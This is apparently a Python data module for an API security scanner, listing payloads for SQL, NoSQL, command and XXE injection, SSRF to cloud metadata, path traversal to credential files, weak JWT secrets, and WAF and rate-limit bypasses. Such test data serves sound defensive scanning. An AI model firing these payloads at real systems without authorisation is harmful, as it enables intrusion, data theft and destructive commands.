"""
API Security Databases

Contains static data: mappings, patterns, and payloads.
"""

import sys
from pathlib import Path as PathLib
sys.path.insert(0, str(PathLib(__file__).parent.parent.parent))

from typing import Dict, Optional, List
from ...proto import (
    TestSubCategory,
    OWASPCategory,
    CWECategory,
)

# =============================================================================
# UI helpers (security_scan v1)
# =============================================================================

API_SECURITY_DEFAULT_RECOMMENDATIONS: list[dict] = [
    {
        "title": "Authenticate and authorize every sensitive route",
        "description": "Require strong auth (OAuth2/OIDC/mTLS) for business APIs; enforce object-level authorization so IDs cannot be traversed across tenants/users.",
        "priority": "high",
    },
    {
        "title": "Throttle abuse and monitor anomalies",
        "description": "Add rate limits, bot/WAF rules on edge, and SIEM alerts for auth failures, schema probing, and unusual error rates per client.",
        "priority": "medium",
    },
    {
        "title": "Treat spec discovery as data exposure",
        "description": "If OpenAPI/GraphQL introspection is public, redact internal paths and examples; require auth for admin or debug routes documented there.",
        "priority": "medium",
    },
]


def build_api_security_basic_commands(base_url: Optional[str]) -> List[str]:
    base = (base_url or "").rstrip("/")
    t = base or "${TARGET_URL}"
    return [
        f"curl -sS -i {t} || true",
        f"curl -sS -i {base + '/health' if base else '${TARGET_URL}/health'} || true",
        f"curl -sS -i {base + '/swagger.json' if base else '${TARGET_URL}/swagger.json'} || true",
        f"curl -sS -i {base + '/openapi.json' if base else '${TARGET_URL}/openapi.json'} || true",
    ]

# =============================================================================
# Payloads
# =============================================================================

# Common JWT secrets to test
COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "key",
    "jwt_secret", "jwt-secret", "token_secret", "your-256-bit-secret",
    "supersecret", "changeme", "letmein", "qwerty",
]

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "1' OR '1'='1",
    "admin'--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
]

# NoSQL Injection payloads
NOSQL_INJECTION_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    "true, $where: '1 == 1'",
    '{"$or": [{}]}',
]

# Command Injection payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "& ping -c 1 127.0.0.1",
]

# XXE payloads
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",  # GCP metadata
]

# Mass assignment fields to test
MASS_ASSIGNMENT_FIELDS = [
    "role", "isAdmin", "is_admin", "admin", "administrator",
    "role_id", "roleId", "user_type", "userType", "type",
    "privilege", "privileges", "permission", "permissions",
    "verified", "is_verified", "isVerified", "active",
    "balance", "credits", "points", "id", "_id", "user_id",
]

# GraphQL introspection query
GRAPHQL_INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

# GraphQL DoS query template (deep nesting)
GRAPHQL_DEEP_QUERY_TEMPLATE = """
query DeepQuery {{
  {nested_query}
}}
"""

# OAuth redirect URI bypass attempts
REDIRECT_URI_BYPASSES = [
    "{original}@redirect-bypass.example.test",
    "{original}.redirect-bypass.example.test",
    "redirect-bypass.example.test/{original}",
    "{original}%2F@redirect-bypass.example.test",
    "{original}?redirect=redirect-bypass.example.test",
    "{original}#@redirect-bypass.example.test",
    "{original}/../redirect-bypass.example.test",
]

# Security headers to check
SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS header missing",
    "X-Content-Type-Options": "X-Content-Type-Options header missing",
    "X-Frame-Options": "X-Frame-Options header missing",
    "Content-Security-Policy": "CSP header missing",
    "X-XSS-Protection": "X-XSS-Protection header missing (legacy)",
}

# =============================================================================
# OWASP and CWE Mappings
# =============================================================================

OWASP_MAPPINGS: Dict[TestSubCategory, OWASPCategory] = {
    TestSubCategory.BOLA: OWASPCategory.API1_BOLA,
    TestSubCategory.IDOR: OWASPCategory.API1_BOLA,
    TestSubCategory.BROKEN_AUTH: OWASPCategory.API2_BROKEN_AUTH,
    TestSubCategory.BRUTE_FORCE: OWASPCategory.API2_BROKEN_AUTH,
    TestSubCategory.CREDENTIAL_STUFFING: OWASPCategory.API2_BROKEN_AUTH,
    TestSubCategory.MASS_ASSIGNMENT: OWASPCategory.API3_BOPLA,
    TestSubCategory.EXCESSIVE_DATA_EXPOSURE: OWASPCategory.API3_BOPLA,
    TestSubCategory.LACK_OF_RESOURCES_RATE_LIMITING: OWASPCategory.API4_UNRESTRICTED_RESOURCE,
    TestSubCategory.GRAPHQL_DOS: OWASPCategory.API4_UNRESTRICTED_RESOURCE,
    TestSubCategory.BFLA: OWASPCategory.API5_BFLA,
    TestSubCategory.PRIVILEGE_ESCALATION: OWASPCategory.API5_BFLA,
    TestSubCategory.SSRF: OWASPCategory.API7_SSRF,
    TestSubCategory.CORS_MISCONFIGURATION: OWASPCategory.API8_SECURITY_MISCONFIG,
    TestSubCategory.SECURITY_HEADERS: OWASPCategory.API8_SECURITY_MISCONFIG,
    TestSubCategory.DEBUG_ENABLED: OWASPCategory.API8_SECURITY_MISCONFIG,
    TestSubCategory.IMPROPER_INVENTORY: OWASPCategory.API9_IMPROPER_INVENTORY,
    TestSubCategory.UNSAFE_CONSUMPTION: OWASPCategory.API10_UNSAFE_CONSUMPTION,
}

CWE_MAPPINGS: Dict[TestSubCategory, CWECategory] = {
    TestSubCategory.BOLA: CWECategory.CWE_639,
    TestSubCategory.IDOR: CWECategory.CWE_639,
    TestSubCategory.SQL_INJECTION: CWECategory.CWE_89,
    TestSubCategory.NOSQL_INJECTION: CWECategory.CWE_89,
    TestSubCategory.COMMAND_INJECTION: CWECategory.CWE_78,
    TestSubCategory.XSS: CWECategory.CWE_79,
    TestSubCategory.XXE: CWECategory.CWE_611,
    TestSubCategory.SSRF: CWECategory.CWE_918,
    TestSubCategory.PATH_TRAVERSAL: CWECategory.CWE_22,
    TestSubCategory.BROKEN_AUTH: CWECategory.CWE_287,
    TestSubCategory.BRUTE_FORCE: CWECategory.CWE_307,
    TestSubCategory.SESSION_FIXATION: CWECategory.CWE_384,
    TestSubCategory.CORS_MISCONFIGURATION: CWECategory.CWE_942,
    TestSubCategory.OAUTH_OPEN_REDIRECT: CWECategory.CWE_601,
    TestSubCategory.JWT_WEAK_SECRET: CWECategory.CWE_522,
    TestSubCategory.LACK_OF_RESOURCES_RATE_LIMITING: CWECategory.CWE_400,
}


# =============================================================================
# API Versioning Attack Patterns
# =============================================================================

API_VERSIONING_ATTACKS = {
    "version_confusion": {
        "description": "API version confusion - accessing deprecated or beta versions",
        "techniques": [
            # URL path versioning
            {"path": "/v1/{endpoint}", "desc": "Legacy v1 endpoint"},
            {"path": "/v0/{endpoint}", "desc": "Beta/dev v0 endpoint"},
            {"path": "/api/v1.0/{endpoint}", "desc": "Semantic version endpoint"},
            {"path": "/api/v1-beta/{endpoint}", "desc": "Beta version endpoint"},
            {"path": "/api/v1-deprecated/{endpoint}", "desc": "Deprecated version"},
            {"path": "/api/internal/{endpoint}", "desc": "Internal API endpoint"},
            {"path": "/api/dev/{endpoint}", "desc": "Development endpoint"},
            {"path": "/api/staging/{endpoint}", "desc": "Staging endpoint"},
            {"path": "/api/test/{endpoint}", "desc": "Test endpoint"},
        ],
        "headers": [
            # Header-based versioning
            {"header": "Api-Version", "values": ["1", "0", "beta", "dev", "internal"]},
            {"header": "X-Api-Version", "values": ["1.0", "0.1", "beta", "deprecated"]},
            {"header": "Accept-Version", "values": ["1", "~1", "1.0.0", "0.9.0"]},
            {"header": "X-Version", "values": ["v1", "v0", "beta"]},
        ],
        "query_params": [
            # Query parameter versioning
            {"param": "version", "values": ["1", "0", "beta", "latest", "dev"]},
            {"param": "api_version", "values": ["1.0", "0.1", "internal"]},
            {"param": "v", "values": ["1", "2", "0"]},
        ],
    },
    "deprecated_endpoint_abuse": {
        "description": "Accessing deprecated endpoints that may lack security patches",
        "indicators": [
            r"deprecated",
            r"legacy",
            r"old",
            r"v[0-9]+\-deprecated",
            r"sunset",
        ],
        "risk": "Deprecated endpoints may have unpatched vulnerabilities",
    },
    "version_header_manipulation": {
        "description": "Manipulating version headers to bypass restrictions",
        "techniques": [
            {"header": "Api-Version", "value": "9999", "desc": "Non-existent future version"},
            {"header": "Api-Version", "value": "-1", "desc": "Negative version"},
            {"header": "Api-Version", "value": "null", "desc": "Null version"},
            {"header": "Api-Version", "value": "admin", "desc": "Admin keyword injection"},
        ],
    },
}


# =============================================================================
# Rate Limiting Bypass Techniques
# =============================================================================

RATE_LIMITING_BYPASS = {
    "header_manipulation": {
        "description": "Bypass rate limiting via header manipulation",
        "techniques": [
            # IP spoofing headers
            {"header": "X-Forwarded-For", "value": "127.0.0.1"},
            {"header": "X-Forwarded-For", "value": "10.0.0.1"},
            {"header": "X-Real-IP", "value": "127.0.0.1"},
            {"header": "X-Originating-IP", "value": "127.0.0.1"},
            {"header": "X-Remote-IP", "value": "127.0.0.1"},
            {"header": "X-Remote-Addr", "value": "127.0.0.1"},
            {"header": "X-Client-IP", "value": "127.0.0.1"},
            {"header": "Client-IP", "value": "127.0.0.1"},
            {"header": "True-Client-IP", "value": "127.0.0.1"},  # Cloudflare
            {"header": "CF-Connecting-IP", "value": "127.0.0.1"},  # Cloudflare
            {"header": "Fastly-Client-IP", "value": "127.0.0.1"},  # Fastly
            # Multiple IPs (may bypass simple validation)
            {"header": "X-Forwarded-For", "value": "127.0.0.1, 192.168.1.1"},
            {"header": "X-Forwarded-For", "value": "127.0.0.1,,"},
        ],
    },
    "request_manipulation": {
        "description": "Bypass rate limiting via request manipulation",
        "techniques": [
            # Case manipulation
            {"method": "GET", "transform": "get"},
            {"method": "GET", "transform": "Get"},
            # Path manipulation
            {"path_suffix": "/", "desc": "Trailing slash"},
            {"path_suffix": "//", "desc": "Double trailing slash"},
            {"path_suffix": "/.", "desc": "Dot at end"},
            {"path_suffix": "?", "desc": "Empty query string"},
            {"path_suffix": "#", "desc": "Fragment"},
            # Encoding
            {"encoding": "url_encode", "desc": "URL encode path"},
            {"encoding": "double_url_encode", "desc": "Double URL encode"},
            {"encoding": "unicode", "desc": "Unicode normalization"},
        ],
    },
    "distributed_bypass": {
        "description": "Distributed rate limiting bypass",
        "techniques": [
            "ip_rotation",
            "user_agent_rotation",
            "session_rotation",
            "api_key_rotation",
            "slow_requests",  # Stay just under rate limit
        ],
    },
    "detection_headers": {
        "description": "Rate limit detection headers",
        "headers": [
            "X-RateLimit-Limit",
            "X-RateLimit-Remaining",
            "X-RateLimit-Reset",
            "RateLimit-Limit",
            "RateLimit-Remaining",
            "RateLimit-Reset",
            "Retry-After",
            "X-Rate-Limit-Limit",
            "X-Rate-Limit-Remaining",
        ],
    },
}


# =============================================================================
# API Gateway & WAF Bypass Techniques
# =============================================================================

API_GATEWAY_ATTACKS = {
    "waf_bypass": {
        "description": "WAF bypass techniques for API gateways",
        "techniques": {
            "encoding_bypass": [
                {"type": "url_encode", "payload": "%27%20OR%20%271%27=%271"},
                {"type": "double_encode", "payload": "%252527%2520OR%2520"},
                {"type": "unicode", "payload": "\\u0027 OR \\u00271\\u0027=\\u00271"},
                {"type": "hex", "payload": "0x27 OR 0x27"},
                {"type": "mixed_case", "payload": "' oR '1'='1"},
            ],
            "header_injection": [
                {"header": "Content-Type", "value": "application/json; charset=utf-7"},
                {"header": "Content-Type", "value": "text/xml"},
                {"header": "X-Original-URL", "value": "/admin"},
                {"header": "X-Rewrite-URL", "value": "/admin"},
            ],
            "method_override": [
                {"header": "X-HTTP-Method-Override", "value": "PUT"},
                {"header": "X-HTTP-Method", "value": "DELETE"},
                {"header": "X-Method-Override", "value": "PATCH"},
            ],
            "path_manipulation": [
                {"path": "/api/./users", "desc": "Dot segment"},
                {"path": "/api/../api/users", "desc": "Path traversal"},
                {"path": "/API/users", "desc": "Case sensitivity"},
                {"path": "/api/users;param=value", "desc": "Parameter pollution"},
                {"path": "/api/users.json", "desc": "Extension injection"},
            ],
        },
    },
    "path_traversal_via_gateway": {
        "description": "Path traversal through API gateway",
        "payloads": [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
    },
    "gateway_auth_bypass": {
        "description": "API gateway authentication bypass",
        "techniques": [
            {"desc": "Direct backend access", "method": "bypass_gateway"},
            {"desc": "Token confusion", "method": "different_token_type"},
            {"desc": "Null auth header", "header": "Authorization", "value": ""},
            {"desc": "Bearer without token", "header": "Authorization", "value": "Bearer "},
            {"desc": "Basic with empty creds", "header": "Authorization", "value": "Basic Og=="},
        ],
    },
    "api_key_leakage": {
        "description": "API key leakage through gateway logs",
        "check_locations": [
            "query_string",
            "url_path",
            "referer_header",
            "access_logs",
            "error_responses",
        ],
    },
}


# =============================================================================
# Serverless API Attacks
# =============================================================================

SERVERLESS_API_ATTACKS = {
    "lambda_injection": {
        "description": "AWS Lambda function injection attacks",
        "payloads": {
            "event_injection": [
                '{"__proto__": {"isAdmin": true}}',  # Prototype pollution
                '{"constructor": {"prototype": {"isAdmin": true}}}',
                '$(env)',  # Environment leak
                '${process.env}',  # Node.js env leak
            ],
            "context_manipulation": [
                "getRemainingTimeInMillis()",
                "functionName",
                "memoryLimitInMB",
                "awsRequestId",
            ],
        },
    },
    "cold_start_attacks": {
        "description": "Exploit Lambda cold start behavior",
        "techniques": [
            "timing_attack",  # Measure cold vs warm start times
            "initialization_race",  # Race condition during init
            "resource_exhaustion",  # Trigger cold starts
            "memory_leak_detection",  # Detect persistence across invocations
        ],
    },
    "serverless_enumeration": {
        "description": "Enumerate serverless functions",
        "indicators": {
            "aws_lambda": [
                "x-amz-function-error",
                "x-amz-executed-version",
                "x-amz-log-result",
                "Lambda-Runtime-",
            ],
            "azure_functions": [
                "x-ms-request-id",
                "x-azure-ref",
                "x-ms-invocation-id",
            ],
            "gcp_functions": [
                "x-cloud-trace-context",
                "function-execution-id",
                "x-google-function-",
            ],
        },
    },
    "timeout_abuse": {
        "description": "Abuse function timeout limits",
        "techniques": [
            {"type": "slow_loris", "desc": "Slow request body"},
            {"type": "regex_dos", "desc": "ReDoS payload"},
            {"type": "infinite_loop", "desc": "Trigger infinite loop"},
            {"type": "large_payload", "desc": "Large payload processing"},
        ],
    },
}


# =============================================================================
# API Documentation Exposure
# =============================================================================

API_DOCUMENTATION_EXPOSURE = {
    "openapi_swagger": {
        "description": "OpenAPI/Swagger information disclosure",
        "endpoints": [
            "/swagger.json",
            "/swagger.yaml",
            "/swagger/",
            "/swagger-ui/",
            "/swagger-ui.html",
            "/api-docs",
            "/api-docs/",
            "/api-docs.json",
            "/openapi.json",
            "/openapi.yaml",
            "/openapi/",
            "/v2/api-docs",
            "/v3/api-docs",
            "/api/swagger.json",
            "/docs/",
            "/docs/api",
            "/redoc/",
            "/rapidoc/",
        ],
        "sensitive_patterns": [
            r"x-api-key",
            r"authorization",
            r"password",
            r"secret",
            r"internal",
            r"admin",
            r"private",
        ],
    },
    "graphql_schema": {
        "description": "GraphQL schema disclosure",
        "queries": [
            '{"query": "{__schema{types{name}}}"}',
            '{"query": "{__schema{mutationType{name}}}"}',
            '{"query": "{__schema{subscriptionType{name}}}"}',
        ],
    },
    "api_enumeration": {
        "description": "API endpoint enumeration via documentation",
        "wordlists": {
            "common_endpoints": [
                "users", "user", "account", "accounts", "profile",
                "admin", "administrator", "login", "logout", "auth",
                "token", "refresh", "password", "reset", "register",
                "signup", "config", "settings", "status", "health",
                "metrics", "debug", "test", "internal", "private",
            ],
            "common_methods": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
        },
    },
}


# =============================================================================
# API Chaining Attacks
# =============================================================================

API_CHAINING_ATTACKS = {
    "multi_step_chains": {
        "description": "Multi-step attack chains",
        "patterns": [
            {
                "name": "create_then_access",
                "steps": ["POST /resources", "GET /resources/{id}"],
                "attack": "IDOR after creation",
            },
            {
                "name": "password_reset_chain",
                "steps": ["POST /forgot-password", "POST /verify-token", "POST /reset-password"],
                "attack": "Token manipulation between steps",
            },
            {
                "name": "invite_escalation",
                "steps": ["POST /invite", "GET /invite/{token}", "PUT /users/{id}/role"],
                "attack": "Privilege escalation via invite flow",
            },
        ],
    },
    "token_reuse": {
        "description": "Token reuse between endpoints",
        "techniques": [
            "csrf_token_reuse",  # Reuse CSRF token across different actions
            "jwt_scope_confusion",  # Use token from one scope in another
            "refresh_token_swap",  # Swap refresh tokens between users
            "api_key_endpoint_mismatch",  # Use key for unauthorized endpoint
        ],
    },
    "state_manipulation": {
        "description": "State manipulation attacks",
        "patterns": [
            "race_condition",  # Parallel requests changing state
            "state_pollution",  # Pollute shared state
            "session_fixation",  # Fix session before authentication
            "parameter_pollution",  # Duplicate parameters with different values
        ],
    },
}


# =============================================================================
# API Authorization Bypass
# =============================================================================

API_AUTHORIZATION_BYPASS = {
    "rbac_bypass": {
        "description": "Role-Based Access Control bypass techniques",
        "techniques": [
            {"type": "role_parameter", "params": ["role", "user_role", "userRole", "role_id"]},
            {"type": "admin_flag", "params": ["isAdmin", "is_admin", "admin", "administrator"]},
            {"type": "permission_array", "params": ["permissions", "scopes", "roles"]},
            {"type": "jwt_claim_manipulation", "claims": ["role", "scope", "permissions", "groups"]},
            {"type": "group_membership", "params": ["group", "groups", "group_id", "team"]},
        ],
    },
    "abac_bypass": {
        "description": "Attribute-Based Access Control bypass",
        "techniques": [
            {"type": "attribute_injection", "params": ["department", "location", "level"]},
            {"type": "context_manipulation", "params": ["ip", "time", "device"]},
            {"type": "resource_attribute", "params": ["owner", "owner_id", "created_by"]},
        ],
    },
    "policy_bypass": {
        "description": "Policy enforcement bypass",
        "techniques": [
            "direct_object_reference",  # Access objects directly
            "force_browsing",  # Access URLs directly
            "method_tampering",  # Change HTTP method
            "content_type_confusion",  # Change content type
            "header_injection",  # Inject authorization headers
        ],
    },
}


# =============================================================================
# API Data Exposure
# =============================================================================

API_DATA_EXPOSURE = {
    "excessive_data": {
        "description": "Excessive data exposure patterns",
        "sensitive_fields": [
            # Personal Data
            "ssn", "social_security", "national_id", "passport",
            "date_of_birth", "dob", "birth_date",
            # Financial
            "credit_card", "card_number", "cvv", "bank_account", "routing_number",
            "balance", "salary", "income",
            # Authentication
            "password", "password_hash", "secret", "api_key", "token",
            "session_id", "refresh_token", "private_key",
            # Internal
            "internal_id", "database_id", "staff_notes", "admin_notes",
            "_id", "__v", "created_by", "modified_by",
        ],
    },
    "error_disclosure": {
        "description": "Error message information disclosure",
        "patterns": [
            r"stack\s*trace",
            r"at\s+\w+\.\w+\(",
            r"Exception|Error|Traceback",
            r"SQL|query|SELECT|INSERT|UPDATE|DELETE",
            r"file\s+\"|path\s+\"",
            r"/var/|/home/|/usr/|C:\\",
            r"password|secret|key|token",
            r"connection\s+string",
            r"database|mongodb|mysql|postgres",
        ],
    },
    "metadata_exposure": {
        "description": "Metadata exposure in responses",
        "headers_to_check": [
            "X-Powered-By",
            "Server",
            "X-AspNet-Version",
            "X-Runtime",
            "X-Version",
            "X-Debug-Token",
            "X-Request-Id",
        ],
    },
}


# =============================================================================
# API Input Validation Attacks
# =============================================================================

API_INPUT_VALIDATION_ATTACKS = {
    "type_confusion": {
        "description": "Type confusion attacks",
        "payloads": {
            "string_to_number": ["123", "123.45", "0", "-1", "NaN", "Infinity"],
            "number_to_string": ['"123"', '"true"', '"null"'],
            "array_to_string": ['["admin"]', "[1,2,3]", "[]"],
            "object_to_string": ['{"key":"value"}', "{}"],
            "null_values": ["null", "None", "nil", "undefined", ""],
            "boolean_confusion": ["true", "false", "1", "0", "yes", "no", "on", "off"],
        },
    },
    "array_injection": {
        "description": "Array injection attacks",
        "payloads": [
            "param[]=value1&param[]=value2",
            "param[0]=value1&param[1]=value2",
            '{"param": ["value1", "value2"]}',
            '{"param": [{"nested": "value"}]}',
            "param[][key]=value",
        ],
    },
    "object_injection": {
        "description": "Object/prototype injection attacks",
        "payloads": [
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            '{"__proto__": {"toString": "malicious"}}',
            '{"prototype": {"polluted": true}}',
        ],
    },
    "boundary_testing": {
        "description": "Boundary and edge case testing",
        "payloads": {
            "numeric_boundaries": [
                0, -1, 1, 2147483647, -2147483648,
                9999999999999999, 1e308, -1e308,
            ],
            "string_lengths": ["", "a", "a" * 100, "a" * 10000, "a" * 1000000],
            "special_chars": [
                "\x00", "\n", "\r", "\t", "\x0b", "\x0c",
                "\\", "/", '"', "'", "`", "<", ">", "&",
            ],
        },
    },
}

